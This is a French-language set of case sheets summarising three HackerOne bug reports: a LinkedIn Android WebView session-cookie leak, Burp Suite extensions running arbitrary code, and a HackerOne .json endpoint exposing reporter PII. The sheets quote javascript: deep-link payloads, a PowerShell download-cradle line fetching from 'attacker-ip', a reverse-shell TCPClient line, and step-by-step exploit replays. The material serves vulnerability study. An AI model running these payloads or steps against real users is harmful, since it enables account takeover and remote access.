# Fiches SSS — Information Disclosure & Credential Leaks

*3 cas sélectionnés dans le corpus 2025-2026 (HackerOne).*

### Session Cookie Leakage via Static Header Field in WebViewerFragment

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3475626)

Dans l'app Android LinkedIn, `WebViewerFragment.loadUrl()` place les cookies de l'URL courante dans `WebViewerFragment.CUSTOM_HEADERS`, un `ArrayMap` statique jamais nettoyé : les cookies du site A sont envoyés au site B. Chaîne d'exploitation : deep-link `https://www.linkedin.com/trust/verification` dont `verificationUrl` accepte le schéma `javascript:` (host seul validé), paramètre `renderContext` neutralisé en fermant la chaîne après `#`, interface `Android.sendWebMessage()` qui lance le fragment vulnérable, regex `FIRST_PARTY_ARTICLE_PATTERN` non ancrée qui force le client `web_viewer`. Le second message charge le serveur de l'attaquant, qui reçoit les cookies de session LinkedIn (prise de contrôle de compte).

**Cause racine :** champ statique conservant les cookies d'une URL à l'autre dans `WebViewerFragment` (état partagé non purgé), combiné à une validation de schéma absente et à une regex de host non ancrée.

**Preuve technique (verbatim depuis la source) :**

```java
        ArrayMap arrayMap0 = WebViewerFragment.CUSTOM_HEADERS; // Static field!
        ...
        if(s2 != null) {
            arrayMap0.put("Cookie", s2);
        }
        this.webView.loadUrl(s, arrayMap0);
```
```text
javascript://www.linkedin.com/%0aalert('1#')
javascript://www.linkedin.com/%0aalert('1?renderContext=trustVerificationDeeplink#')
```
```java
WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN = Pattern.compile("(http|https)://www.linkedin(-ei)?.com/pulse/+");
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : appareil Android avec l'app LinkedIn installée ; un domaine attaquant hébergeant la page HTML de PoC (`{COLLABORATOR_HOST}`) ; la victime ouvre la page dans un navigateur mobile puis tape le lien.
- Étapes : 1. héberger le HTML de PoC (deep-link `trust/verification` + payload `javascript:` encodé) en remplaçant `{COLLABORATOR_HOST}`. 2. Faire ouvrir la page à la victime depuis un navigateur mobile et taper « Click Here » : la WebView LinkedIn s'ouvre. 3. Au retour/fermeture, une seconde WebView s'ouvre vers `{COLLABORATOR_HOST}` (appels espacés de 1000 ms). 4. Observer le header `Cookie` (tokens de session) dans les logs serveur.
- Pièges / limites : payload à double encodage (`%250a`) et fermeture `'#')` pour rendre le JavaScript valide malgré le paramètre ajouté ; sans navigation préalable vers linkedin.com, le champ statique est vide.

**Reproductibilité :** moyenne — payload et étapes complets, mais exigent un appareil Android avec l'app, un domaine hébergé et un clic de la victime.

**Techniques :** static field state persistence, webview javascript scheme injection, url fragment smuggling, javascript interface abuse, unanchored regex bypass, cookie exfiltration

**Correspond aux classes qualifiantes :** ato (vol de cookies de session), info disclosure, webview javascript injection

**Signal (endpoints/fonctions observés) :**
- `WebViewerFragment.loadUrl()` / `WebViewerFragment.CUSTOM_HEADERS`
- `https://www.linkedin.com/trust/verification?verificationUrl=`
- `Android.sendWebMessage()` (`additionalWebViewUrl`)
- `WebViewerUtils.isLinkedInArticleUrl()` / `FIRST_PARTY_ARTICLE_PATTERN`

**Paramètres impliqués :** `verificationUrl`, `additionalWebViewUrl`, `renderContext`

### Burp Suite extensions can execute arbitrary code

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3014158)

Le rapport démontre qu'une extension Burp Suite s'exécute avec les privilèges de l'utilisateur : une extension Python anodine peut créer un script PowerShell caché qui télécharge un payload distant, ouvrir un reverse shell Netcat et exécuter des commandes système en arrière-plan. La source souligne que la signature d'extensions existe mais que beaucoup d'utilisateurs la désactivent ou installent des extensions non vérifiées. Le rapport a été classé *informative* (`substate: informative`) ; le PoC complet est référencé comme pièce jointe (`{F4093216}`).

**Cause racine :** le framework d'extensions exécute du code tiers non sandboxé avec les privilèges de l'utilisateur (pas de restriction imposée sur `subprocess.Popen()`/`os.system()` ni de signature obligatoire), ce qui transforme l'installation d'une extension en vecteur d'exécution de code.

**Preuve technique (verbatim depuis la source) :**

```python
       file.write("Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker-ip:8000/rev.ps1\')\"'")
```
```python
   subprocess.Popen(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], shell=True)
```
```powershell
$client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : convaincre la cible d'installer l'extension malveillante (modèle « Trojan horse ») ; le PoC complet est une pièce jointe absente du texte (`{F4093216}`).
- Étapes : 1. créer une extension Burp au comportement visible inoffensif (calculatrice, notepad). 2. Y embarquer l'écriture de `poc.ps1` dans le répertoire de l'extension, exécuté via `powershell.exe -ExecutionPolicy Bypass -File`. 3. Le script PowerShell télécharge et exécute un payload distant, puis ouvre un reverse shell Netcat vers l'attaquant. 4. Faire installer l'extension par la cible et constater l'accès persistant.
- Pièges / limites : non documenté dans la source pour les canaux de distribution de l'extension ; le rapport a été trié *informative* (comportement attendu du framework selon le programme) ; le PoC complet est une pièce jointe non incluse.

**Reproductibilité :** moyenne — snippets d'exécution fournis, mais l'attaque exige l'installation volontaire de l'extension par la victime et le PoC complet est une pièce jointe caviardée.

**Techniques :** malicious extension, trojan horse, powershell staging, reverse shell, persistence, unsigned extension install

**Correspond aux classes qualifiantes :** rce (client-side, via extension), ato/social engineering (installation d'une extension)

**Signal (endpoints/fonctions observés) :**
- `subprocess.Popen(...)` dans une extension Burp (Python/Jython)
- `powershell.exe -ExecutionPolicy Bypass -File poc.ps1`
- `IEX(New-Object Net.WebClient).DownloadString(...)`, reverse shell TCP (`TCPClient("attacker-ip",4444)`)

**Paramètres impliqués :** `file_path`, `attacker-ip`, port `4444`

### The /reports/:id.json endpoint discloses potentially sensitive user attributes

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3000510)

Le `.json` d'un rapport divulgué expose bien plus que la page rendue : e-mail du reporter, codes de secours OTP, numéro de téléphone, `graphql_secret_token`, taille de t-shirt et autres données internes du compte reporter. Le chercheur a découvert le comportement en consultant un rapport divulgué et a rapporté immédiatement. Le titre de la source lie l'exposition à la présence du « reporter summary » du rapport. Le rapport a été marqué *resolved*.

**Cause racine :** l'endpoint `.json` d'un rapport divulgué sérialise des attributs privés du compte reporter (e-mail, OTP, token interne) au lieu de les restreindre à la vue publique — la source ne documente pas le correctif exact.

**Preuve technique (verbatim depuis la source) :**

```http
GET /reports/█████.json HTTP/2
Host: hackerone.com
```
```text
The.json endpoint of any disclosed report is leaking reporter's email, OTP backup codes, reporter's phone number, "graphql_secret_token", tshirt size all the reporter account's internal details etc.
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte — il suffit de connaître l'identifiant d'un rapport divulgué ; la condition d'exposition est la présence du reporter summary.
- Étapes : 1. ouvrir un rapport divulgué de HackerOne et relever son identifiant numérique. 2. Requêter le même rapport avec l'extension `.json` (`GET /reports/<id>.json`, `Host: hackerone.com`). 3. Inspecter la réponse et les champs privés du reporter (e-mail, OTP, téléphone, tokens).
- Pièges / limites : les identifiants et les valeurs du PoC sont caviardés (█████) dans la source ; la mention « any disclosed report » indique que les rapports non divulgués ne sont pas concernés ; le rapport est marqué *resolved* — la fenêtre d'exploitation est fermée.

**Reproductibilité :** moyenne — endpoint public sans authentification, mais identifiants exacts caviardés et comportement corrigé (rapport *resolved*).

**Techniques :** json api over-exposure, reporter pii leak, mixed serialization (public vs private fields), unauthenticated api access

**Correspond aux classes qualifiantes :** info disclosure (pii/credentials), idor adjacent (accès direct au JSON d'une ressource)

**Signal (endpoints/fonctions observés) :**
- `GET /reports/:id.json` sur hackerone.com
- champs exposés : `graphql_secret_token`, e-mail, OTP backup codes, numéro de téléphone, tshirt size

**Paramètres impliqués :** `:id` (identifiant de rapport divulgué)
